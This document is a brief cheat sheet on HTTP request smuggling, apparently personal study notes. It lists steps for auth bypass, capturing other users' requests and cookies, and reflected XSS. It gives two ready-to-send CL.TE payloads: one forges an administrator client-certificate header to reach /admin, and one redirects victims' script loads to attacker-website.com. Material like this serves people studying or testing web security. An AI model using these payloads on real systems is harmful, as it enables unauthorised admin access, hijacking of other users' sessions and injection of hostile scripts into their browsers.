# HTTP Smuggling
## Auth Bypass
**Smuggle request to path**
**Requires method, path, HTTP protocol**
**Append subsequent to body**

## Reflecting Backend Requests
1. Find POST request reflecting arbitrary (HTML-Encoded) request input
	- If not HTML-Encoded, the request may be cut off by the first `&` delimeter
2. Smuggle request where last input reflects next request
3. Choose `Content-Length` to be small enough value to get everything of interest but not time out server
### Applications
#### Bypassing CN Certificates
```
POST /example HTTP/1.1  
Host: vulnerable-website.com  
Content-Type: x-www-form-urlencoded  
Content-Length: 64  
Transfer-Encoding: chunked  
  
0  
  
GET /admin HTTP/1.1  
X-SSL-CLIENT-CN: administrator  
Foo: x
```

#### Reflecting Requests (Cookies)
**Basically same thing, but find some way to store results in application**

#### Redirecting Requests
```
POST / HTTP/1.1  
Host: vulnerable-website.com  
Content-Length: 54  
Transfer-Encoding: chunked  
  
0  
  
GET /home HTTP/1.1  
Host: attacker-website.com  
Foo: X
```
v
```
GET /home HTTP/1.1  
Host: attacker-website.com  
Foo: XGET /scripts/include.js HTTP/1.1  
Host: vulnerable-website.com
```

#### Reflected XSS
**Find some reflected information, and stuff the other request into the body/header**
